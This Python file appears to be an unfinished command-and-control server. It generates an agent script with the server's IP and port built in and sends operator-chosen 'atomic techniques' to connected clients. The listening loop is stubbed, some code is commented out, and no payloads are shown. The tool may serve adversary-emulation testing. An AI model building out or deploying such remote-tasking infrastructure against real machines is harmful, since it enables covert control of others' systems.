from socket import AF_INET, SOCK_STREAM, socket
from datetime import datetime
from json import dumps
from threading import Thread
import argparse
from bin.fragments import body_script
from tools.generate_control import generate_atomic_map
from tools.generate_control import generate_control



class server:
    def __init__(self):
        self.control = generate_control(parse)
        print(self.control)


    def main(self):
        if self.control['action'] == 'listen':
            self.server_loop()
        else:
            self.create_agent()
    
    def server_loop(self):
        print('server_loop')
        pass
    
    def create_agent(self):
        print('create agent')
        with open(f'{self.control["path"]}/client.py', 'w') as file:
            script = body_script.replace("'IP_SERVER'", f"'{self.control['ip']}'").replace("'PORT_SERVER'", f"{self.control['port']}")
            file.write(script)
        
    def client_handler(self, client_socket):
        print('------- To break send break to sdtin --------')
        while True:
            atomic = input('[INFO] Atomic techinique: ')
            if not atomic or 'break' in atomic:
                break
            try:
                control = dumps(generate_atomic_map(atomic)).encode()
            except:
                print('[ERROR] Exception, ERROR!')
                break
            else:
                try:
                    client_socket.send(control)
                except:
                    print(f'[ERROR] Client {addr} is off.')
                    break
                else:
                    buffer = client_socket.recv(1028).decode().split('\n')
                    print(f'[INFO] We receive: ', end='')
                    print(buffer)
            
    

'''server = socket(AF_INET, SOCK_STREAM)
server.bind((ip, port))
server.listen(5)

print(f'[INFO] Lisening on: {ip}/{port}')
while True:
    client_socket, addr = server.accept()
    client_handler = Thread(target=client_handler, args=(client_socket, ))
    client_handler.start()'''

if __name__ == '__main__':
    args = argparse.ArgumentParser()
    args.add_argument('-l', '--listen', dest='listen', help='listen mode', default=True )
    args.add_argument('-ip', '--ip', dest='ip', default='0.0.0.0', type=str, help='Server ip')
    args.add_argument('-c', '--create', dest='create', help='Creat an agente', default=False)
    args.add_argument('-p', '--port', dest='port', default=45000, type=int, help='Port that the server will be listening')
    args.add_argument('-ph', '--path', dest='path', default=__file__.replace('/main.py', ''), help='Path to creat a client')
    parse = args.parse_args()
    
    start = server()
    start.main()


